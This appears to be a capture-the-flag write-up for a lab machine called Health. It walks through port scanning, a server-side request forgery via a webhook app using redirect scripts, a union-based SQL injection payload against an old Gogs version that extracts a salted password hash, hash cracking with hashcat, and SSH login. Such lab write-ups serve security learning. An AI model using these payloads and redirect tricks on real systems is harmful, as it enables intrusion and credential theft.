I"à≠<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap-scan">Nmap Scan</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre># Nmap 7.93 scan initiated Wed Jan 11 12:05:23 2023 as: nmap -sC -sV -oN nmap-scan 10.10.11.176
Host is up (0.18s latency).
Scanned at 2023-01-11 12:05:26 EAT for 74s
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32b7f4d42f45d330ee123b0367bbe631 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQChNRnKkpENG89qQHjD+2Kt9H7EDTMkQpzin70Rok0geRogbYVckxywChDv3yYhaDWQ9RrsOcWLs3uGzZR9nCfXOE3uTENbSWV5GdCd3wQNmWcSlkTD4dRcZshaAoMjs1bwzhK+cOy3ZU/ywbIXdHvAz3+Xvyz5yoEnboWYdWtBNFniZ7y/mZtA/XN19sCt5PcmeY40YFSuaVy/PUQnozplBVBIN6W5gnSE0Y+3J1MLBUkvf4+5zKvC+WLqA394Y1M+/UcVcPAjo6maik1JZNAmquWWo+y+28PdXSm9F2p2HAvwJjXc96f+Fl80+P4j1yxrhWC5AZM8fNCX8FjD7Jl7
|   256 86e15d8c2939acd7e815e649e235ed0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOR0vwVJwhe/5A7dkomT/li2XC2nvv6/4J6Oe8Xeyi/YQspx3RQGz3aG1sWTPstLu7yno0Z+Lk/GotRdyivSdLA=
|   256 ef6bad64d5e45b3e667949f4ec4c239f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINgiR3y8U+HenhKVoN1EFipbmC6EjO3fWwWPUqa8EeJh
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: HTTP Monitoring Tool
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jan 11 12:06:40 2023 -- 1 IP address (1 host up) scanned in 77.77 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p>In this box only two ports were open, the <code class="language-plaintext highlighter-rouge">ssh</code> port and <code class="language-plaintext highlighter-rouge">webapp</code> port and also there is another <code class="language-plaintext highlighter-rouge">filtered</code> port, port <code class="language-plaintext highlighter-rouge">3000</code>. This port seems to be handled by firewall and seems as there is some sort of redirection required. Lets visit the web-application hosted at port <code class="language-plaintext highlighter-rouge">80</code> and see what is with this page:-</p>

<p><img src="/assets/img/health/00.png" alt="image" /></p>

<p>The page requires to a <code class="language-plaintext highlighter-rouge">url</code> to be monitored then i entered the followings:-</p>

<p><strong>In my Linux machine(Attacker‚Äôs machine)</strong></p>
<ol>
  <li>Hosting anything for testing.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]
‚îî‚îÄ$ python3 -m http.server 80
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Listen for if there is any hit from the web application.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]
‚îî‚îÄ$ nc -nlvp 1235 
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
</ol>

<p><strong>In Web application</strong></p>
<ol>
  <li>In payload URL
 <code class="language-plaintext highlighter-rouge">http://10.10.14.18:1235</code></li>
  <li>In Monitored URL
 <code class="language-plaintext highlighter-rouge">http://10.10.14.18</code>
And then entered the interval and then testing it.</li>
</ol>

<p><strong>Results</strong></p>

<p>In web application the result seems to be health</p>

<p><img src="/assets/img/health/01.png" alt="image" /></p>

<p>On Linux machine there is also a hit, the</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]
‚îî‚îÄ$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.176 - - [05/Oct/2022 12:17:10] "GET / HTTP/1.0" 200 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><code class="language-plaintext highlighter-rouge">netcat</code> returned a hit but seem it has all the outputs from my machine, for the initial step its cool but the main goal here is trying to have access to the <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> to see what is with it.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]
‚îî‚îÄ$ nc -nlvp 1235                                                                                                                                                                                                                         
listening on [any] 1235 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.176] 46500
POST / HTTP/1.1
Host: 10.10.14.18:1235
Accept: */*
Content-type: application/json
Content-Length: 673

{"webhookUrl":"http:\/\/10.10.14.18:1235","monitoredUrl":"http:\/\/10.10.14.18","health":"up","body":"&lt;!DOCTYPE HTML PUBLIC \"-\/\/W3C\/\/DTD HTML 4.01\/\/EN\" \"http:\/\/www.w3.org\/TR\/html4\/strict.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta http-equiv=\"Content-Type\" content=\"text\/html; charset=utf-8\"&gt;\n&lt;title&gt;Directory listing for \/&lt;\/title&gt;\n&lt;\/head&gt;\n&lt;body&gt;\n&lt;h1&gt;Directory listing for \/&lt;\/h1&gt;\n&lt;hr&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\"health\"&gt;health&lt;\/a&gt;&lt;\/li&gt;\n&lt;\/ul&gt;\n&lt;hr&gt;\n&lt;\/body&gt;\n&lt;\/html&gt;\n","message":"HTTP\/1.0 200 OK","headers":{"Server":"SimpleHTTP\/0.6 Python\/3.10.7","Date":"Wed, 05 Oct 2022 09:18:51 GMT","Content-type":"text\/html; charset=utf-8","Content-Length":"334"}}
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The above result shows that the result obtained is from <code class="language-plaintext highlighter-rouge">http://10.10.14.18</code> but we want to get result form <code class="language-plaintext highlighter-rouge">http://127.0.0.1:3000</code></p>
<h3 id="redirection-to-localhost-web-hook">Redirection to localhost web-hook</h3>
<p>The redirection can be performed by two methods one by using <code class="language-plaintext highlighter-rouge">python</code> and another by using <code class="language-plaintext highlighter-rouge">php</code></p>

<p><strong>Redirection by using <code class="language-plaintext highlighter-rouge">python</code></strong>
This code will redirect the <code class="language-plaintext highlighter-rouge">Location</code> from <code class="language-plaintext highlighter-rouge">10.10.11.176</code> to <code class="language-plaintext highlighter-rouge">127.0.0.1:3000</code> run the code as <code class="language-plaintext highlighter-rouge">python3 exploit.py 3000</code></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">HTTPServer</span><span class="p">,</span> <span class="n">BaseHTTPRequestHandler</span>

<span class="k">class</span> <span class="nc">Redirect</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
	<span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">302</span><span class="p">)</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Location'</span><span class="p">,</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
		<span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>

<span class="n">HTTPServer</span><span class="p">((</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="mi">80</span><span class="p">),</span> <span class="n">Redirect</span><span class="p">).</span><span class="n">serve_forever</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The above code (exploit) should work with <code class="language-plaintext highlighter-rouge">python</code> and <code class="language-plaintext highlighter-rouge">netcat</code> in order to get results from <code class="language-plaintext highlighter-rouge">localhost:3000</code>
Steps for <code class="language-plaintext highlighter-rouge">python</code> redirection.</p>
<ol>
  <li>Start a listener by using <code class="language-plaintext highlighter-rouge">nc</code> command
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]
‚îî‚îÄ$ nc -nlvp 1235
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Specify the location you want to be redirected by using <code class="language-plaintext highlighter-rouge">python</code> code.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/exploit]
‚îî‚îÄ$ python exploit.py "http://127.0.0.1:3000"
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>On web application enter the address links as before.</p>
  </li>
  <li>Click the test button then you will have the result.</li>
</ol>

<p><strong>Redirection by using <code class="language-plaintext highlighter-rouge">php</code></strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">header</span><span class="p">(</span><span class="s2">"Location: http://127.0.0.1:3000"</span><span class="p">);</span>
<span class="k">die</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<ol>
  <li>Host the file by using <code class="language-plaintext highlighter-rouge">php</code>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/exploit]
‚îî‚îÄ$ php -S 0.0.0.0:8
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Listen with <code class="language-plaintext highlighter-rouge">netcat</code> as before
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]
‚îî‚îÄ$ nc -nlvp 1235
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Then send the request in the web browser.</li>
</ol>

<p><strong>Result</strong></p>

<p>Both methods will result to the following output.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/www]                                                                                                        ‚îî‚îÄ$ nc -nlvp 1235                                                                                                                                            listening on [any] 1234 ...                                                                                                                                    connect to [10.10.14.21] from (UNKNOWN) [10.10.11.176] 41024                                                                                                   POST / HTTP/1.1                                                                                                                                                Host: 10.10.14.21:1234                                                                                                                                         Accept: */*                                                                                                                                                    Content-type: application/json                                                                                                                                 Content-Length: 7733                                                                                                                                           Expect: 100-continue    

{"webhookUrl":"http:\/\/10.10.14.21:1234","monitoredUrl":"http:\/\/10.10.14.21","health":"up","body":"&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n\t&lt;head data-suburl=\"\"&gt;\n\t\t&lt;meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-8\" \/&gt;\n        &lt;meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\/&gt;\n        &lt;meta name=\"author\" content=\"Gogs - Go Git Service\" \/&gt;\n\t\t&lt;meta name=\"description\" content=\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\" \/&gt;\n\t\t&lt;meta name=\"keywords\" content=\"go, git, self-hosted, gogs\"&gt;\n\t\t&lt;meta name=\"_csrf\" content=\"k5-MAum4s1tawmByRJJToJ9EG5E6MTY3MzQzMjE2NDc2MjI3NzA4Mw==\" \/&gt;\n\t\t\n\n\t\t&lt;link rel=\"shortcut icon\
</pre></td></tr></tbody></table></code></pre></div></div>
<p>To make the result readable use <code class="language-plaintext highlighter-rouge">jq</code> for the <code class="language-plaintext highlighter-rouge">json</code> readability and then redirect to the <code class="language-plaintext highlighter-rouge">html</code> file which you will browse it to see its structure.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/data]
‚îî‚îÄ$ cat web| jq -r .body &gt; res.hmtl
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Then open the <code class="language-plaintext highlighter-rouge">res.html</code> file by your favorite  browser to see how it looks like.</p>

<p><img src="/assets/img/health/07.png" alt="image" /></p>

<p>This will result to some interesting results which shows what application is run on localhost and this is <code class="language-plaintext highlighter-rouge">Gogs - Go Git Service</code> <code class="language-plaintext highlighter-rouge">2014 GoGits \u00b7 Version: 0.5.5.1010</code> this shows the version of the <code class="language-plaintext highlighter-rouge">gogs</code></p>

<p>On searching on exploit db we will find two <code class="language-plaintext highlighter-rouge">txt</code> files which shows that the <code class="language-plaintext highlighter-rouge">gogs</code> version is vulnerable to <code class="language-plaintext highlighter-rouge">sqlinjection</code></p>

<p><strong>Command</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health]
‚îî‚îÄ$ searchsploit gogs                            
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Gogs - 'label' SQL Injection                  | multiple/webapps/35237.txt
Gogs - 'users'/'repos' '?q' SQL Injection     | multiple/webapps/35238.txt
---------------------------------------------- ---------------------------------
</pre></td></tr></tbody></table></code></pre></div></div>
<p>The most interesting file between the two is that with name of <code class="language-plaintext highlighter-rouge">35238</code>.  To copy it to the machine use the following command</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/C7F5/htb/health/exploit]
‚îî‚îÄ$ searchsploit -m multiple/webapps/35238.txt
</pre></td></tr></tbody></table></code></pre></div></div>
<p>While reading the <code class="language-plaintext highlighter-rouge">txt</code> file it reveals that there is <code class="language-plaintext highlighter-rouge">Unauthenticated SQL Injection in Gogs repository search</code>  which can be exploited at <code class="language-plaintext highlighter-rouge">/api/v1/users/search?q=&lt;search query&gt;</code> this is <code class="language-plaintext highlighter-rouge">CVE-2014-8682</code> and Affect two versions which are</p>
<ol>
  <li><code class="language-plaintext highlighter-rouge">&gt;= v0.3.1-9-g49dc57e</code></li>
  <li><code class="language-plaintext highlighter-rouge">&lt;= v0.5.6.1104-g0c5ba45</code></li>
</ol>

<p>The Question to ask here is how we can exploit this machine, well since <code class="language-plaintext highlighter-rouge">gogs</code> is open source we can go to <a href="https://github.com/gogs/gogs/releases?page=7">github</a> and download the same version as that on machine and host it locally , attack it and then perform the attack to the machine.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/‚Ä¶/htb/health/gogs_local/gogs]
‚îî‚îÄ$ ./gogs         
NAME:
   Gogs - Go Git Service

USAGE:
   Gogs [global options] command [command options] [arguments...]

VERSION:
   0.5.5.1010 Beta

COMMANDS:
   web          Start Gogs web server
   serv         This command should only be called by SSH shell
   update       This command should only be called by SSH shell
   fix          This command for upgrade from old version
   dump         Dump Gogs files and database
   cert         Generate self-signed certificate
   help, h      Shows a list of commands or help for one command
   
GLOBAL OPTIONS:
   --help, -h           show help
   --version, -v        print the version
</pre></td></tr></tbody></table></code></pre></div></div>
<p>If you run the <code class="language-plaintext highlighter-rouge">gogs</code> binary it will prompt the version which is similar to our version in machine</p>

<p><img src="/assets/img/health/03.png" alt="image" /></p>

<p><img src="/assets/img/health/04.png" alt="image" /></p>

<p><img src="/assets/img/health/05.png" alt="image" /></p>

<p>If you check on source codes these are exactly as those we have in the box</p>
<h3 id="sql-injection">SQL injection</h3>
<p>There is no need to<code class="language-plaintext highlighter-rouge">bruteforce</code> the columns and table because i can access it from the <code class="language-plaintext highlighter-rouge">gogs</code> in <code class="language-plaintext highlighter-rouge">data</code>. For me am only interested in table <code class="language-plaintext highlighter-rouge">user</code> which have the following columns:-</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>(`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT n?tableuseruserCREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NO
T NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL, `full_name` TEXT NULL, `email` TEXT NOT NULL, `passwd` TEXT NOT NULL, `login_type` INTEGER NULL, `log
in_source` INTEGER NOT NULL DEFAULT 0, `login_name` TEXT NULL, `type` INTEGER NULL, `num_followers` INTEGER NULL, `num_followings` INTEGER NULL, `num_stars` IN
TEGER NULL, `num_repos` INTEGER NULL, `avatar` TEXT NOT NULL, `avatar_email` TEXT NOT NULL, `location` TEXT NULL, `website` TEXT NULL, `is_active` INTEGER NULL
, `is_admin` INTEGER NULL, `rands` TEXT NULL, `salt` TEXT NULL, `created` NUMERIC NULL, `updated` NUMERIC NULL, `description` TEXT NULL, `num_teams` INTEGER NU
LL, `num_members` INTEGER NULL)
</pre></td></tr></tbody></table></code></pre></div></div>
<p>To make it readable i copied these columns in another file and then i replaced <code class="language-plaintext highlighter-rouge">,</code> with <code class="language-plaintext highlighter-rouge">\n</code> and have the columns as follows:-</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/‚Ä¶/htb/health/gogs_local/gogs]
‚îî‚îÄ$ cat gogs.txt | sed 's/,/ \r\n/g'   
(`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT n?tableuseruserCREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL 
 `lower_name` TEXT NOT NULL 
 `name` TEXT NOT NULL 
 `full_name` TEXT NULL 
 `email` TEXT NOT NULL 
 `passwd` TEXT NOT NULL 
 `login_type` INTEGER NULL 
 `login_source` INTEGER NOT NULL DEFAULT 0 
 `login_name` TEXT NULL 
 `type` INTEGER NULL 
 `num_followers` INTEGER NULL 
 `num_followings` INTEGER NULL 
 `num_stars` INTEGER NULL 
 `num_repos` INTEGER NULL 
 `avatar` TEXT NOT NULL 
 `avatar_email` TEXT NOT NULL 
 `location` TEXT NULL 
 `website` TEXT NULL 
 `is_active` INTEGER NULL 
 `is_admin` INTEGER NULL 
 `rands` TEXT NULL 
 `salt` TEXT NULL 
 `created` NUMERIC NULL 
 `updated` NUMERIC NULL 
 `description` TEXT NULL 
 `num_teams` INTEGER NULL 
 `num_members` INTEGER NULL))
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Then lets extract data from this local <code class="language-plaintext highlighter-rouge">gogs</code> and then every successful payload will be used to attack the box.
<img src="/assets/img/health/09.png" alt="image" />
<strong>Payload</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>')/**/UNION/**/ALL/**/SELECT/**/1,2,(select/**/salt/**/from/**/user)||':'||(select/**/passwd/**/from/**/user),4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/- 
</pre></td></tr></tbody></table></code></pre></div></div>
<p><strong>Result</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>HTTP/1.1 200 OK
Content-Type: application/json; charset=UTF-8
Date: Wed, 11 Jan 2023 12:08:16 GMT
Content-Length: 277
Connection: close

{"data":[{"username":"hashghost","avatar":"//1.gravatar.com/avatar/70b03db954aa45fc2559e85f5d5bd13e"},{"username":"Al1tII06ac:eb4b08d0fa0e44bd4db74a4a9193a9a1c6b5dfbd282b1550041753bf169bce208e9ede10ead57d1cbf2636a185ee3e36ca60","avatar":"//1.gravatar.com/avatar/15"}],"ok":true
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="user">User</h2>
<p>Now i can use the payload which will print username,password and the salt from the box. now lets fire the <code class="language-plaintext highlighter-rouge">python/php</code> and submit the payload then listen to fetch results.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ(egovridc„âøegovridc)-[~/‚Ä¶/htb/health/www]
‚îî‚îÄ$ nc -nlvp 1235
listening on [any] 1235 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.11.176] 34818
POST / HTTP/1.1
Host: 10.10.14.18:1235
Accept: */*
Content-type: application/json
Content-Length: 987

{"webhookUrl":"http:\/\/10.10.14.18:1235","monitoredUrl":"http:\/\/10.10.14.18","health":"up","body":"{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"},{\"username\":\"sO3XIbeW14:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/15\"}],\"ok\":true}","message":"HTTP\/1.0 302 Found","headers":{"Host":"10.10.14.18","Date":"Wed, 11 Jan 2023 12:16:20 GMT","Connection":"close","X-Powered-By":"PHP\/8.1.12","Location":"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/UNION\/**\/ALL\/**\/SELECT\/**\/1,2,(select\/**\/salt\/**\/from\/**\/user)||':'||(select\/**\/passwd\/**\/from\/**\/user),4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--\/**\/-","Content-type":"text\/html; charset=UTF-8","Content-Type":"application\/json; charset=UTF-8","Set-Cookie":"_csrf=; Path=\/; Max-Age=0","Content-Length":"276"}}
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I have user <code class="language-plaintext highlighter-rouge">sussane</code> with password <code class="language-plaintext highlighter-rouge">sO3XIbeW14:66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37</code></p>

<p>Since <code class="language-plaintext highlighter-rouge">gogs</code> is open source, then i can browse for the files of this version and access codes to see how the <code class="language-plaintext highlighter-rouge">password</code> is encoded or i can read from <code class="language-plaintext highlighter-rouge">gogs</code> i installed locally before, this can be found in <a href="https://github.com/gogs/gogs/blob/54930c001df8316d8dfda450b5c39379df2cc1b1/models/user.go">models</a> and the hash function is:-</p>

<p><img src="/assets/img/health/08.png" alt="image" /></p>

<p>Encoded hash will have password and salt with iteration 10000 and key-length 50 and sha256 as hashing algorithm. Then i will refer this output from <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a> and it is likely to be in module 10900.
Since the hash is in hexadecimal and do not provide the salt together then i will make the hash to be similar to that of from hashcat.</p>
<ol>
  <li>Create a salt
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ echo -n sO3XIbeW14 | base64                                                                                                            
c08zWEliZVcxNA==
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Decode password and use <code class="language-plaintext highlighter-rouge">xxd</code> to decode from hexadecimal.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ echo -n 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 | xxd -r -p | base64 -w 0 
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Put all together as module 10900 consider the rounds here are 10000 ten times than in example.
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sha256:1000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
</pre></td></tr></tbody></table></code></pre></div>    </div>
  </li>
  <li>Cracking the hash
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt 
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p><strong>Result</strong></p>
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=:february15
</pre></td></tr></tbody></table></code></pre></div>    </div>
    <p>Password is <code class="language-plaintext highlighter-rouge">february15</code></p>
  </li>
</ol>

<p><strong>User flag</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>‚îî‚îÄ$ ssh susanne@10.10.11.176 
susanne@health:~$ cat user.txt 
4a59adbcdba2**********
</pre></td></tr></tbody></table></code></pre></div></div>
<h2 id="root-user">Root user</h2>
<p>After having user access i uploaded <code class="language-plaintext highlighter-rouge">linpeas.sh</code> and here are some interesting results:-</p>
